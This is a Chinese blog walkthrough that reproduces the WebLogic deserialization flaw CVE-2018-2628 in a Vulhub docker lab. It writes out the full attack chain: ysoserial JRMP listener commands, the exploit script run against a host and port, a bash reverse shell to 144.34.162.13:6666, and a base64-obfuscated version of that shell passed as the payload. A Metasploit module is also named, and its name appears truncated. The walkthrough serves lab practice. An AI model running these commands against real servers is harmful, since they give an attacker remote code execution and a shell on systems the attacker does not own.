ailx10说：这篇是我2024年9月写的。我原来复现 Java 反序列化总爱老老实实用 ysoserial，这次做 WebLogic 时，也试了试直接上 Metasploit 的省事路子。先用文件确认，再做连接，对照两种方式看同一条链。原文里那句迷茫时去刷 Vulhub，确实是当时的状态：不知道该学什么，先找个具体问题做完，总比胡乱翻资料强。这篇留的是一个小练习，也想提醒自己，工具把步骤包起来以后，发请求、等回连和处理对象的几方角色还是得分清。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628） 环境搭建成功了

![](/notes-assets/dd265efd524caf7bce0c.webp)

（1）准备 ysoserial

```
 wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar -O ysoserial-all.jar
```

（2）运行 ysoserial 开启JRMP服务，监听端口3333，执行创建文件的命令

```
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 3333  CommonsCollections1 "touch /tmp/ailx10"
```

![](/notes-assets/38b12adcbb1fef2d3793.webp)

（3）运行漏洞利用脚本[\[1\]](#ref_1)，注意是python2.7

```
python2.7 cve-2018-2628.py 144.34.162.13 7001 ./ysoserial-all.jar 144.34.162.13 3333 JRMPClient
```

![](/notes-assets/88a95e15aa0c9efc3409.webp)

（4）进入docker 查看文件创建成功

```
docker exec a8ccac7cc005 ls /tmp
```

![](/notes-assets/a89fa46abc4973763305.webp)

（5）反弹shell

```
bash -i >& /dev/tcp/144.34.162.13/6666 0>&1
```

base64编码

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMTYyLjEzLzY2NjYgMD4mMQ==
```

最终的反弹shell字符串

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMTYyLjEzLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
```

（6）运行 ysoserial 开启JRMP服务，监听端口3333，执行反弹shell的命令

```
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 3333  CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMTYyLjEzLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

![](/notes-assets/7703e434ad9676ab740a.webp)

（7）运行漏洞利用脚本，注意是python2.7（同上一摸一样的操作）

```
python2.7 cve-2018-2628.py 144.34.162.13 7001 ./ysoserial-all.jar 144.34.162.13 3333 JRMPClient
```

（8）反弹shell成功

![](/notes-assets/912e4a20baf26071d2af.webp)

（9）使用MetaSploit 更加简单，直接能够反弹shell

```
use exploit/multi/misc/weblogic_deserialize_asyncresponseservic
```
